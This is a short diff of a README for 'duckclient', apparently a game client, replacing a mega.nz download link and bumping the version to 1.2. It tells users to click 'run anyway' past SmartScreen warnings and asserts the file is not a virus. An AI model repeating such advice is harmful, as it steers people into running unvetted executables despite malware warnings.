@@ -1,4 +1,4 @@
 # duckclient
 Made by therapistextreme#3466
 (Click run anyway, if smartscreen comes up its not a virus, review the code for urself)
-https://mega.nz/file/x1sxlLxb#3jFfudjqlOgoHb_BRsuXldy41RDlQhVMo-Hc80oYUPk(download) github kinda brokey also release 1.0
+hhttps://mega.nz/file/1kFghDZS#ZiNFbnqosIHREZT08sTDqZnJTcRC04ex9ZDnYtXJi8o(download) github kinda brokey also release 1.2
